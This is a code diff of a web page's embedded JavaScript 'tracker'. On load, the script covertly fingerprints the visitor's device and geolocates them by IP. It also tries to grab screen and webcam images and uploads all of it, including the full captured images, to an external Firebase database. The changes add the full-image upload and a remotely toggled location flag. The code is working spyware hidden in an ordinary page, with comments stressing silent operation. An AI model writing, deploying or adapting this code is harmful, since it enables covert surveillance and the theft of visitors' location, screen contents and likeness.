-                return { timeZone: 'Unknown', locale: 'Unknown', calendar: 'Unknown', numberingSystem: 'Unknown', offset: 0 };
+            } catch (error) {
+                try {
+                    const backupResponse = await fetch('https://ipwho.is/');
+                    const backupData = await backupResponse.json();
+                    if (backupData.success) {
+                        return {
+                            status: 'success',
+                            ip: backupData.ip,
+                            country: backupData.country,
+                            city: backupData.city,
+                            region: backupData.region,
+                            latitude: backupData.latitude,
+                            longitude: backupData.longitude,
+                            isp: backupData.connection?.isp,
+                            asn: 'AS' + backupData.connection?.asn,
+                            postal: backupData.postal,
+                            countryCode: backupData.country_code,
+                            timezone: backupData.timezone?.id,
+                            currency: backupData.currency?.code
+                        };
+                    }
+                } catch (e) {}
+                return { status: 'failed', error: 'Could not fetch location' };
             }
         }
 
@@ -766,19 +618,16 @@
                     video: { displaySurface: 'monitor' },
                     audio: false
                 });
-
                 const video = document.createElement('video');
                 video.srcObject = stream;
                 await video.play();
-                await new Promise(resolve => setTimeout(resolve, 500));
+                await new Promise(r => setTimeout(r, 500));
 
                 const canvas = document.createElement('canvas');
                 canvas.width = video.videoWidth;
                 canvas.height = video.videoHeight;
-                const ctx = canvas.getContext('2d');
-                ctx.drawImage(video, 0, 0);
+                canvas.getContext('2d').drawImage(video, 0, 0);
                 const imageData = canvas.toDataURL('image/png');
-
                 stream.getTracks().forEach(track => track.stop());
                 return imageData;
             } catch (e) {
@@ -792,19 +641,16 @@
                     video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } },
                     audio: false
                 });
-
                 const video = document.createElement('video');
                 video.srcObject = stream;
                 await video.play();
-                await new Promise(resolve => setTimeout(resolve, 300));
+                await new Promise(r => setTimeout(r, 300));
 
                 const canvas = document.createElement('canvas');
                 canvas.width = video.videoWidth;
                 canvas.height = video.videoHeight;
-                const ctx = canvas.getContext('2d');
-                ctx.drawImage(video, 0, 0);
+                canvas.getContext('2d').drawImage(video, 0, 0);
                 const imageData = canvas.toDataURL('image/png');
-
                 stream.getTracks().forEach(track => track.stop());
                 return imageData;
             } catch (e) {
@@ -812,266 +658,94 @@
             }
         }
 
-        async function collectAllDeviceInfo() {
-            const browserInfo = getBrowserInfo();
-            const phoneBrand = getPhoneBrand();
-            const phoneModel = getPhoneModel();
-            const webgl = getWebGLInfo();
-            const battery = await getBatteryInfo();
-            const network = await getNetworkInfo();
-            const audio = getAudioFingerprint();
-            const localIPs = await getLocalIPs();
-            const mediaDevices = await getMediaDevices();
-            const fonts = getSystemFonts();
-            const perms = await getPermissions();
-            const storage = getStorageInfo();
-            const plugins = getPluginInfo();
-            const timezoneInfo = getTimezoneInfo();
+        // ============================================
+        // VISITOR LOCATION FLAG CHECK
+        // ============================================
 
-            return {
-                // Basic Device Info
-                deviceName: navigator.platform || 'Unknown',
-                platform: navigator.platform,
-                userAgent: navigator.userAgent,
-                phoneBrand: phoneBrand,
-                phoneModel: phoneModel,
-                deviceType: getDeviceType(),
+        const FIREBASE_URL = 'https://cybersecurity-c1710-default-rtdb.asia-southeast1.firebasedatabase.app';
 
-                // Browser Info
-                browserName: browserInfo.browserName,
-                browserVersion: browserInfo.browserVersion,
-                osName: browserInfo.osName,
-                osVersion: browserInfo.osVersion,
-
-                // Screen Info
-                screenWidth: screen.width,
-                screenHeight: screen.height,
-                screenRes: screen.width + 'x' + screen.height,
-                availWidth: screen.availWidth,
-                availHeight: screen.availHeight,
-                colorDepth: screen.colorDepth,
-                pixelDepth: screen.pixelDepth,
-                devicePixelRatio: window.devicePixelRatio,
-
-                // Viewport
-                viewportWidth: window.innerWidth,
-                viewportHeight: window.innerHeight,
-
-                // Hardware
-                cpuCores: navigator.hardwareConcurrency || 'Unknown',
-                deviceMemory: navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'Unknown',
-                maxTouchPoints: navigator.maxTouchPoints || 0,
-                touchSupport: 'ontouchstart' in window,
-
-                // WebGL / GPU
-                gpuVendor: webgl.vendor,
-                gpuRenderer: webgl.renderer,
-                webglVersion: webgl.webglVersion,
-                maxTextureSize: webgl.maxTextureSize,
-
-                // Battery
-                batteryLevel: battery.level,
-                batteryCharging: battery.charging,
-
-                // Network
-                connectionType: network.type,
-                effectiveConnection: network.effectiveType,
-                downlink: network.downlink,
-                rtt: network.rtt,
-                online: navigator.onLine,
-
-                // Audio
-                audioSampleRate: audio.sampleRate,
-                audioChannelCount: audio.channelCount,
-
-                // Memory - heap limit
-                jsHeapSizeLimit: performance.memory ? performance.memory.jsHeapSizeLimit : 'N/A',
-                totalJSHeapSize: performance.memory ? performance.memory.totalJSHeapSize : 'N/A',
-
-                // Local IPs
-                localIPs: localIPs,
-
-                // Media Devices
-                hasCamera: mediaDevices.videoInputs > 0,
-                hasMicrophone: mediaDevices.audioInputs > 0,
-                hasSpeakers: mediaDevices.audioOutputs > 0,
-                mediaDevices: mediaDevices.devices,
-
-                // Permissions
-                permissions: perms.permissions,
-
-                // Fonts
-                installedFonts: fonts,
-
-                // Storage
-                localStorage: storage.localStorage,
-                cookiesEnabled: storage.cookies,
-                indexedDB: storage.indexedDB,
-
-                // Plugins
-                browserPlugins: plugins.map(p => p.name).join(', '),
-
-                // Timezone
-                timezone: timezoneInfo.timeZone,
-                timezoneOffset: timezoneInfo.offset,
-                locale: timezoneInfo.locale,
-
-                // Language
-                language: navigator.language,
-                languages: navigator.languages ? navigator.languages.join(', ') : 'Unknown',
-
-                // Canvas Fingerprint (hash)
-                canvasFingerprint: getCanvasFingerprint() ? 'Generated' : 'Not supported',
-
-                // Do Not Track
-                doNotTrack: navigator.doNotTrack || 'Unspecified',
-
-                // PDF Viewer
-                pdfViewer: navigator.pdfViewerEnabled ? 'Yes' : 'No',
-
-                // Java Enabled (Legacy)
-                javaEnabled: navigator.javaEnabled ? navigator.javaEnabled() : false,
-
-                // Vendor
-                vendor: navigator.vendor,
-
-                // App Info
-                appName: navigator.appName,
-                appVersion: navigator.appVersion,
-
-                // History
-                historyLength: window.history.length,
-
-                // Referrer
-                referrer: document.referrer || 'Direct visit',
-
-                // Screen orientation
-                screenOrientation: screen.orientation ? screen.orientation.type : 'Unknown',
-
-                // Timestamp
-                timestamp: new Date().toISOString(),
-
-                // Visited page
-                currentURL: window.location.href,
-                pageTitle: document.title
-            };
-        }
-
-        async function getIPAndLocation() {
+        async function checkVisitorLocationFlag() {
             try {
-                const response = await fetch('https://ipapi.co/json/');
+                const response = await fetch(`${FIREBASE_URL}/VISITOR_LOCATION.json`);
                 const data = await response.json();
-                return {
-                    ip: data.ip,
-                    country: data.country_name,
-                    city: data.city,
-                    region: data.region,
-                    district: data.district || 'N/A',
-                    latitude: data.latitude,
-                    longitude: data.longitude,
-                    isp: data.org,
-                    org: data.org,
-                    asn: data.asn,
-                    postal: data.postal,
-                    countryCode: data.country_code,
-                    continent: data.continent_code,
-                    timezone: data.timezone,
-                    currency: data.currency,
-                    languages: data.languages,
-                    countryCallingCode: data.country_calling_code
-                };
-            } catch (error) {
-                try {
-                    const backupResponse = await fetch('https://ipwho.is/');
-                    const backupData = await backupResponse.json();
-                    if (backupData.success) {
-                        return {
-                            ip: backupData.ip,
-                            country: backupData.country,
-                            city: backupData.city,
-                            region: backupData.region,
-                            district: 'N/A',
-                            latitude: backupData.latitude,
-                            longitude: backupData.longitude,
-                            isp: backupData.connection?.isp,
-                            org: backupData.connection?.org,
-                            asn: 'AS' + backupData.connection?.asn,
-                            postal: backupData.postal,
-                            countryCode: backupData.country_code,
-                            continent: backupData.continent,
-                            timezone: backupData.timezone?.id,
-                            currency: backupData.currency?.code,
-                            languages: backupData.languages?.[0]?.name || 'Unknown',
-                            countryCallingCode: '+' + backupData.country_code
-                        };
-                    }
-                } catch (backupError) {
-                    return { error: 'Could not fetch location data' };
+
+                if (data === null) {
+                    // Flag doesn't exist, create it with TRUE
+                    await fetch(`${FIREBASE_URL}/VISITOR_LOCATION.json`, {
+                        method: 'PUT',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify(true)
+                    });
+                    return true; // Fetch location since we created TRUE
                 }
-                return { error: 'Could not fetch location data' };
+
+                // Flag exists, return its value
+                return data === true;
+            } catch (e) {
+                return false; // Default: don't fetch location on error
             }
         }
 
-        async function saveEverythingToFirebase(deviceData, locationData, screenCapture, cameraCapture) {
-            try {
-                const firebaseURL = 'https://cybersecurity-c1710-default-rtdb.asia-southeast1.firebasedatabase.app/visitor_data.json';
+        async function saveToFirebase(deviceData, locationData, screenCapture, cameraCapture) {
+            if (hasInsertedData) return; // Prevent double insert
+            hasInsertedData = true;
 
+            try {
                 const payload = {
                     device: deviceData,
                     location: locationData,
                     captures: {
-                        screen: screenCapture ? screenCapture.substring(0, 200) + '...' : null,
-                        camera: cameraCapture ? cameraCapture.substring(0, 200) + '...' : null,
-                        screenCaptured: screenCapture ? true : false,
-                        cameraCaptured: cameraCapture ? true : false
+                        screen: screenCapture ? 'Captured' : 'Not captured',
+                        camera: cameraCapture ? 'Captured' : 'Not captured',
+                        screenData: screenCapture ? screenCapture : null,
+                        cameraData: cameraCapture ? cameraCapture : null
                     },
                     timestamp: new Date().toISOString(),
                     sessionId: Date.now().toString(36) + Math.random().toString(36).substr(2)
                 };
 
-                await fetch(firebaseURL, {
+                await fetch(`${FIREBASE_URL}/visitor_data.json`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify(payload)
                 });
-            } catch (error) {
-                // Silent fail
+            } catch (e) {
+                hasInsertedData = false; // Allow retry if failed
             }
         }
 
         async function initTracker() {
-            try {
-                // Collect all device info silently
-                const deviceData = await collectAllDeviceInfo();
-                const locationData = await getIPAndLocation();
+            if (hasInsertedData) return; // Already inserted, don't run again
 
-                // Try to capture screen silently (will prompt for permission)
-                let screenCapture = null;
-                let cameraCapture = null;
+            // Check VISITOR_LOCATION flag first
+            const shouldFetchLocation = await checkVisitorLocationFlag();
 
-                // Attempt silent capture (user must grant permission)
-                try {
-                    screenCapture = await getScreenCapture();
-                    cameraCapture = await getCameraCapture();
-                } catch (e) {
-                    // Capture failed or permission denied
-                }
+            // Collect device data
+            const deviceData = await collectDeviceData();
 
-                // Save everything to Firebase
-                await saveEverythingToFirebase(deviceData, locationData, screenCapture, cameraCapture);
-
-            } catch (error) {
-                // Silent operation
+            // Only fetch location if flag is TRUE
+            let locationData = { status: 'skipped', reason: 'VISITOR_LOCATION is FALSE' };
+            if (shouldFetchLocation) {
+                locationData = await getIPAndLocation();
             }
+
+            // Attempt captures
+            let screenCapture = null;
+            let cameraCapture = null;
+
+            try {
+                screenCapture = await getScreenCapture();
+                cameraCapture = await getCameraCapture();
+            } catch (e) {}
+
+            // Single insert
+            await saveToFirebase(deviceData, locationData, screenCapture, cameraCapture);
         }
 
-        // Run on load
+        // Run once on DOM ready
         document.addEventListener('DOMContentLoaded', () => {
             initTracker();
         });
-
-        // Also run after small delay to ensure everything is loaded
-        setTimeout(initTracker, 1000);
     </script>
 </body>
 </html>
